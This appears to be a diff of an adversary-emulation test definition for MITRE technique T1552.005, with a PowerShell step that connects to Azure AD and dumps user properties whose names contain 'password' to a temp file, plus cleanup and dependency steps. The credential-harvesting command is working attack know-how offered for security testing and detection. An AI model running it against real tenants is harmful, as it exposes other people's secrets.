@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "e47abb49-6020-4b6b-8206-a11f2a0176af",
+      "id": "7fe39e02-7601-48ee-a627-8bf863be0eee",
       "type": "execute-command",
       "data": {
         "command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "0395e5d7-3172-4f0f-8669-bf94c2c3b332",
+      "id": "c7076ca3-3e7c-4314-8272-aec0fd62c3ad",
       "type": "execute-command",
       "data": {
         "command": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "32c7cfab-8322-4098-9f11-cf40284ef889",
+      "id": "c442eec7-e137-4e48-802f-708871dd4e97",
       "name": "Check dependency 1/1",
       "description": "The MSOnline module must be installed.\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "db04985c-965d-4304-a9c4-d5f37d873935",
+      "id": "aba5c430-4485-4211-9926-d5f45830f2ed",
       "name": "Resolve dependency 1/1",
       "description": "The MSOnline module must be installed.\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "install-module MSOnline\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "e3305128-d287-418f-9f3e-5ec2c52ef267",
+      "id": "46fac504-a361-4023-b120-0c75af63d529",
       "name": "Re-check dependency 1/1",
       "description": "The MSOnline module must be installed.\n",
       "type": "execute-command",
@@ -55,57 +55,57 @@
         "command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "e47abb49-6020-4b6b-8206-a11f2a0176af",
+      "s": "7fe39e02-7601-48ee-a627-8bf863be0eee",
       "p": "on-success",
-      "o": "0395e5d7-3172-4f0f-8669-bf94c2c3b332"
+      "o": "c7076ca3-3e7c-4314-8272-aec0fd62c3ad"
     },
     {
-      "s": "e47abb49-6020-4b6b-8206-a11f2a0176af",
+      "s": "7fe39e02-7601-48ee-a627-8bf863be0eee",
       "p": "on-failure",
-      "o": "0395e5d7-3172-4f0f-8669-bf94c2c3b332"
+      "o": "c7076ca3-3e7c-4314-8272-aec0fd62c3ad"
     },
     {
-      "s": "32c7cfab-8322-4098-9f11-cf40284ef889",
+      "s": "c442eec7-e137-4e48-802f-708871dd4e97",
       "p": "on-success",
-      "o": "e47abb49-6020-4b6b-8206-a11f2a0176af"
+      "o": "7fe39e02-7601-48ee-a627-8bf863be0eee"
     },
     {
-      "s": "32c7cfab-8322-4098-9f11-cf40284ef889",
+      "s": "c442eec7-e137-4e48-802f-708871dd4e97",
       "p": "on-failure",
-      "o": "db04985c-965d-4304-a9c4-d5f37d873935"
+      "o": "aba5c430-4485-4211-9926-d5f45830f2ed"
     },
     {
-      "s": "db04985c-965d-4304-a9c4-d5f37d873935",
+      "s": "aba5c430-4485-4211-9926-d5f45830f2ed",
       "p": "on-success",
-      "o": "e3305128-d287-418f-9f3e-5ec2c52ef267"
+      "o": "46fac504-a361-4023-b120-0c75af63d529"
     },
     {
-      "s": "e3305128-d287-418f-9f3e-5ec2c52ef267",
+      "s": "46fac504-a361-4023-b120-0c75af63d529",
       "p": "on-failure",
-      "o": "e47abb49-6020-4b6b-8206-a11f2a0176af"
+      "o": "7fe39e02-7601-48ee-a627-8bf863be0eee"
     }
   ],
   "tags": [
-    "T1552.005",
-    "atomic-red-team"
+    "T1552",
+    "T1552.005"
   ],
   "input_arguments": [
-    {
-      "name": "password",
-      "type": "string",
-      "description": "Azure AD password",
-      "value": "T1082Az"
-    },
     {
       "name": "username",
       "type": "string",
       "description": "Azure AD username",
       "value": ""
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Azure AD password",
+      "value": "T1082Az"
     }
   ]
 }
